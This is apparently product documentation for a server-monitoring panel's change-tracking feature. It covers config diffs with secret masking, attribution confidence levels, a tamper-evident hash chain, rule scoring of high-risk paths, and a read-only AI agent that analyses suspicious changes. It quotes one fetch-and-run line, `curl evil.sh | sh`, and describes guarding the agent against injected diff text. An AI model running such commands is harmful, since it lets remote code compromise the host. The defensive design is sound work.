# 變更感知

絕大多數線上故障和入侵，都是由「某個東西被改了」開始的。但傳統監控只看結果指標（CPU 高了、磁碟滿了），看不到原因；而 AI 排查時最常見的一句話是「我不知道它上次好好的到現在發生了什麼」。

變更感知補的就是這一層：**誰，在什麼時候，把什麼，從什麼樣改成了什麼樣**。它只記錄事實，不做判斷——判斷交給規則複核和 Agent。

## 採集什麼

六類來源，全部只讀觀察，靠輪詢和讀系統檔案，不裝 agent、不改系統配置：

| 來源 | 觀察物件 | 粒度 |
|---|---|---|
| 配置檔案 | `/etc` 下高危與常見配置（nginx、sshd、sudoers、hosts、sysctl、fstab…） | 逐行 diff |
| 軟體包 | dpkg / rpm 安裝、升級、解除安裝 | 包名 + 版本變化 |
| 服務狀態 | systemd 單元的 active/failed、啟停、重啟 | 單元狀態遷移 |
| 賬號與許可權 | 使用者增刪、組變更、sudo 授權 | 賬號與組差異 |
| 防火牆規則 | iptables / nftables 規則集 | 規則行差異 |
| 定時任務 | 系統 crontab、使用者 crontab、`/etc/cron.d` | 任務行差異 |

配置檔案是重點也最容易做砸：它按內容雜湊做基線，檔案沒變就不產生事件；變了才計算逐行 diff，並對內容做**脫敏**（`password=`、`api_key=`、私鑰塊等替換為佔位符）後再落庫。

## 誰改的：誠實的三級歸因

歸因做不到 100% 準確，所以不假裝準確：

| 置信度 | 含義 | 判斷依據 |
|---|---|---|
| `confirmed` 已確認 | 能確定到具體人 | 變更時刻存在唯一活躍的 SSH 會話 / 面板操作記錄 |
| `inferred` 推斷 | 大概是誰 | 變更前後有某賬號登入，或由已知的包管理器操作產生 |
| `unknown` 未知 | 不知道 | 沒有可用線索（例如 cron 觸發的指令碼改動） |

介面上會把 `inferred` 單獨標出來，`unknown` 直接寫「未知」，不會用「系統」兩個字糊過去。

## 防篡改：雜湊鏈

每條變更記錄都帶前一條的雜湊，形成一條鏈。任何一條被刪除或改寫，後續校驗就會斷在那一處。

- 面板「變更」頁頂部可隨時校驗（`變更鏈校驗`）
- 校驗結果會指出斷點位置，用於判斷「是資料損壞，還是有人在刪記錄」
- 空庫或首條記錄的錨點異常時會自愈，不會因為歷史版本遺留狀態導致永遠報紅

## 規則複核：0 token 的成本先判一道

每條變更進來後先過一遍**純規則打分**（不呼叫大模型），輸出 0–1 的分數和三到五條理由：

| 加分項 | 權重 |
|---|---|
| 高危路徑（`/etc/passwd`、`authorized_keys`、`sudoers`、`ld.so.preload`、systemd、cron…） | +0.45 |
| 重要配置（nginx、mysql、redis、hosts、sysctl、fstab…） | +0.20 |
| 操作者未知 | +0.25 |
| 操作者只是推斷 | +0.10 |
| 來源是公網地址 | +0.30 |
| root 透過 SSH 修改 | +0.15 |
| 非工作時段 | +0.15 |
| 週末 | +0.05 |
| 1 小時內反覆修改同一物件 | +0.15 |
| 30 分鐘內主機上有高危事件 | +0.35 |
| 該操作者第一次改這個物件 | +0.10 |
| **減分**：包管理器/系統目錄產生的變更 | **−0.35** |
| **減分**：包管理/快取目錄 | **−0.10** |

分檔：

| 分數 | 判定 | 後續 |
|---|---|---|
| ≥ 0.55 | **可疑** | 事件等級升到 high，喚醒 Agent 做深度分析 |
| 0.30 – 0.55 | 待確認 | 記錄，不進 Agent |
| < 0.30 | 正常 | 只記錄 |

這一步的價值：把「apt 升級產生的 300 條變更」自動壓到「正常」，只把真正值得看的幾條送到大模型面前。

## Agent 深度分析

判為可疑的變更會帶著**原始 diff** 直接進 Agent 的調查上下文（連同操作者、來源 IP、涉及欄位、增刪行數）。Agent 拿到的任務不是「這個變更危險嗎」，而是：

```
【判定】正常運維 / 需人工確認 / 高度可疑
【依據】不超過 5 條，每條一句話
【建議】放行 / 建議回滾某個具體物件（由人執行，你沒有寫許可權）
```

它會被引導按優先順序取證：先看 diff 本身，再核對操作者近期登入，只在必要時補查持久化位置（`authorized_keys`、cron、systemd、`ld.so.preload`），最後判斷這是孤立運維操作還是攻擊鏈的一環。

預算預設 12 步 / 240 秒 / 10 萬 token，冷卻 600 秒（同一條鏈 10 分鐘內只分析一次）。**寫許可權為零**：變更類事件被強制降級為 shadow，寫工具全部禁用。

> 注入防護：diff 正文是不可信輸入。送進模型前會做邊界加固——正文包在帶哨兵的程式碼塊裡，圍欄長度按內容自適應，正文裡偽造的段落標記和結束哨兵會被中和。**內容本身不改**：`curl evil.sh | sh` 這一行必須原樣呈現，它就是結論。

## 忽略規則

不是所有變更都值得記錄。對已知的噪聲（例如某個應用每分鐘重寫自己的快取檔案），可以加忽略規則：

- 支援 glob，`*` 匹配單層、`**` 匹配任意層
- 規則對**採集層**生效——命中後連事件都不會產生，不是「產生了再隱藏」
- 變更列表裡可以一鍵從當前物件生成規則

規則管理在「變更 → 忽略規則」，每條可帶備註，隨時刪除。

## 快照與回滾

對配置檔案和賬號類變更，OpsMini 在改動前會保留一份原檔案快照（受配額約束）：

- 變更詳情裡可以直接「回滾到這次變更之前」，帶二次確認
- 回滾前會再打一份當前狀態快照，失敗可再回滾回來
- 快照按數量和總量雙重配額清理，不會把磁碟撐爆

## 併入攻擊鏈

從 v1.4 起，**可疑變更可以作為攻擊鏈的「持久化」環節**：

- 前提三條同時成立：規則複核判為可疑、改的是能扛過重啟的位置、鏈上已經出現了「執行落地」或「外聯控制」
- 時間窗 1 小時內（超過 1 小時的同名變更更可能是運維收尾）
- 變更永不作為攻擊鏈的起點——單獨的配置修改不構成入侵

變更列表的判定列會顯示「已併入攻擊鏈」，點一下跳到對應攻擊鏈；攻擊鏈的環節標籤上也會註明該環節來自「變更」還是「WebShell / 可疑程序 / 網路外聯」。

## 預設保留與配額

| 項 | 預設 |
|---|---|
| 變更後設資料保留 | 30 天 |
| diff 正文保留 | 7 天 |
| diff 正文總量上限 | 可配置（超出按最舊淘汰） |
| 快照數量/總量 | 可配置（超出按最舊清理） |

保留策略在「面板設定」中可調。過期只刪 diff 正文，後設資料與雜湊鏈保留，所以「這條記錄存在過」這件事本身不會被抹掉。

## 已知限制

- **重啟後的第一輪掃描會漏採**：檔案源以啟動時的掃描作為基線，程序重啟期間發生的檔案改動不會被記為「變更」（因為沒有上一版可比）。這不是 bug，是雜湊基線掃描的固有行為。要觀察某個檔案，等面板穩定執行 20 秒以上再做改動。
- **只覆蓋文字配置**：二進位制檔案、超大的日誌類檔案不採集 diff。
- **歸因依賴登入日誌**：如果主機上清空了 `wtmp`/`lastlog`，歸因會退化為「未知」——而這本身就是一個值得注意的訊號。
